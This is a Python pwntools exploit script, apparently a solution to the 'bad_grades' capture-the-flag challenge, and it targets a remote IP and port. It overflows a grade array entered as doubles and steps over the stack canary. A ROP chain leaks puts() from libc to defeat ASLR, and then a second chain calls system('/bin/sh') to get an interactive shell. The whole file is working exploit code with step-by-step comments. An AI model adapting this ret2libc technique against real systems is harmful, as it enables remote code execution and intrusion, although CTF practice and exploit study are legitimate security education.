#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
 
def hex_to_double(val):
    # we need to make sure it is 8 bytes so use 64bits packer
    val = p64(val).hex()
    # print(val) # debug to see if there is "0x" infront
    # return in double (little endian)
    val = struct.unpack('d', bytes.fromhex(val))[0]
 
    # our input must be in string when sending over to the server
    return str(val)
 
binary = ELF("./bad_grades")
context.arch = 'amd64'
 
rop_binary = ROP(binary)
 
r = remote("206.189.26.97", 31557)
 
 
############################# LEAK LIBC's address ############################# 
 
# choose choice 2 after the main page when receive prompt
r.sendlineafter("> ", "2")
# 36th is the start of RET addr location. Need 4 indexes for our ROP chain
r.sendlineafter("Number of grades: ", "39")
 
# We will just use dot (.) to skip all grades input from the 1st 33 indexes (index 0 to 32). 
# Using dot (.) at index 33 helps to skip canary from being overwritten.
# Index 34 is the base pointer. Can overwrite it but I choose not to by skipping it.
for i in range(35):
    r.sendline(".")
 
# Have to one by one send parts of our ROP payload instead of usually ROP string chain since input is in double
 
# find POP RDI to store our puts.got address into RDI since it is on stack after our gadget address by writing to index 35
r.sendline(hex_to_double(rop_binary.find_gadget(["pop rdi", 'ret'])[0]))
# so that we will put this puts.got on stack so that can be pop into RDI by our gadget to leak ASLR puts at libc's address by writing to index 36
r.sendline(hex_to_double(binary.got["puts"]))
# to print the ASLR address of puts in libc by writing to index 37
r.sendline(hex_to_double(binary.plt["puts"]))
# jump back to choice_2() by writing to index 38
r.sendline(hex_to_double(0x400FD5))
 
# to ignore the printed average grade result
r.recvuntil("\n")
leaked_puts_libc_addr = u64(r.recvuntil("\n").strip().ljust(8, b"\x00"))
log.info("Leaked server's libc address, puts(): " + hex(leaked_puts_libc_addr))
 
 
# set local libc's address to server's ASLR libc's base address
libc = ELF("./libc.so.6")
libc.address = leaked_puts_libc_addr - libc.symbols['puts']
log.info("Leaked server's libc base address: " + hex(libc.address))
 
 
 
 
############################# GET SHELL #############################
 
rop_libc = ROP(libc)
 
# 36th is the start of RET addr location. Need 4 indexes for our ROP chain
r.sendlineafter("Number of grades: ", "39")
 
# We will just use dot (.) to skip all grades input from the 1st 33 indexes (index 0 to 32). 
# Using dot (.) at index 34 helps to skip canary from being overwritten.
# Index 34 is the base pointer. Can overwrite it but I choose not to by skipping it.
for i in range(35):
    r.sendline(".")
 
# put gadget with only "RET" by writing to index 35 which is a dummy gadget so that we have have stack alignment
r.sendline(hex_to_double((rop_libc.find_gadget(["ret"]))[0]))
# find POP RDI to store "/bin/sh" address into RDI since it is on stack after our gadget address by writing to index 36
r.sendline(hex_to_double(rop_libc.find_gadget(["pop rdi", 'ret'])[0]))
# find the address of string "/bin/sh" and put on stack by writing to index 37
r.sendline(hex_to_double(next(libc.search(b"/bin/sh\x00"))))
# to "return"/jump to system() by writing to index 38
r.sendline(hex_to_double(libc.symbols["system"]))
 
# to ignore the printed average grade result
r.recvuntil("\n")
 
r.interactive()